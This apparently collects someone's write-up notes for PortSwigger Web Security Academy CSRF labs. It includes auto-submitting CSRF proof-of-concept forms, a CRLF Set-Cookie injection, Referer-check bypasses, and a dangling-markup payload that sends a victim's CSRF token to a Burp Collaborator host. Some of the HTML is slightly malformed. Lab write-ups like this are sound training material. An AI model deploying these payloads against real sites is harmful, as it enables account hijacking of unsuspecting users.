
# Lab: CSRF where token validation depends on request method

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://aca21fc71f70a596802ed12c0003007e.web-security-academy.net/my-account/change-email?email=asdsad&#64;sadfgsdf&#46;comd" method="GET">
      <input type="hidden" name="email" value="asdsad&#64;sadfgsdf&#46;comd" />
      <input type="hidden" name="csrf" value="IFWKxYWLDSFyyoUe11vrWWTqAh4BWWcm" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```


# Lab: CSRF where token is not tied to user session

This lab does not validate the csrf token belong to the specific session, just that the csrf token is valid, this means that if we have a valid csrf token we can use it to achieve XSS and change email of another user with XSS (without his csrf token).

To apply this we simply click on change mail, log the interaction and look at the HTML to see the most recent (and still valid - unused) csrf token, with it we build an HTML with the CSRF exploit (that sends that csrf token) and send it to the victims computer


# Lab: Reflected XSS protected by CSP, with dangling markup attack

After a quick look around we notice that we can send to my-account a GET email parameter that is vulnerable to dangling markup attack (this was noticed because the email is sent in the change email request + the email tag has an empty value). 

Exploit this reflected XSS can be done like so:
```http
https://your-lab-id.web-security-academy.net/my-account?email="><table background='
```
This will allow us to create a malicious page and send it to the user, hopefully to get the csrf token back (which is below the email tag in the html)

```html
<script>
location='https://your-lab-id.web-security-academy.net/my-account?email=%22%3E%3Ctable%20background=%27//your-collaborator-id.burpcollaborator.net?';
</script>
```
After we got the request back from the user we get:
```html
/?">                            <input required type="hidden" name="csrf" value="N7NbGoKZPCGpo2AVtBK86u8qYb5dBlwl">                            <button class=
```
as the GET payload, this includes the csrf token and now we can use this token to construct an HTML page to the victim to change his email like so:
```html
<!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac331fe31eeb8b0580f50f0800f000d2.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="csrf" value="N7NbGoKZPCGpo2AVtBK86u8qYb5dBlwl" />
      <input type="hidden" name="email" value="asdsad&#64;sadfgsdf&#46;com&quot;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

```

# Lab: CSRF where token is tied to non-session cookie

Upon trying the update email functionality we notice that changing the csrfkey changes the csrf token - which means that the cookie and key are connected (and not the session)

if we log in the second account and change the mail with the csrf token + the csrfkey cookie of the first user, we successfully change the second user
's email. 

we will now create a malicious URL:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac831ff81e51bb8e808ae49800460067.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asdfasdf&#64;asfdgasdf" />
      <input type="hidden" name="csrf" value="SRSd3qRKNz6ML8fLJOI5LvaGHUn8jpjj" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
<img src="https://ac831ff81e51bb8e808ae49800460067.web-security-academy.net//?search=test%0d%0aSet-Cookie:%20csrfKey=your-key" onerror="document.forms[0].submit()">
    </script>
  </body>
</html>
```

This way we make sure we first set the cookie using the src and the (after not finding an image there) we submit the document and change the victim's email address

# Lab: CSRF where Referer validation depends on header being present

We first note that our email is changed as well if the referer header is omitted.

Next we will bypass the CSRF mitigation - referer check that checks the Referer by inserting meta tag like so:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
<meta name="referrer" content="never">
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://acdf1f501ee6baae801726ef000200fe.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asdfasdf&#64;asfdgasdf" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
This will prevent the following requests from this page to have a referer header and sucecessfully change the email

# Lab: Validation of Referer can be circumvented
We noticed using repeater that when sending a post request to change-email, the referer is validated by the server.

The validation was not perfect, however, the server accepted URLs ending with the valid referer. 
```python
# Valid Referer:
https://ac821f091e77d437805c064100ab0088.web-security-academy.net/my-account/
# Also valid Referer:
123123123https://ac821f091e77d437805c064100ab0088.web-security-academy.net/my-account/
```

Then we created a CSRF site using the burpsuite tool, making 2 minor changes:
Head:
```html
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url
```
Body:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/?ac821f091e77d437805c064100ab0088.web-security-academy.net/my-account')</script>
    <form action="https://ac821f091e77d437805c064100ab0088.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="123123&#64;123123" />
      <input type="submit" value="Submit request" />
      <img src
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

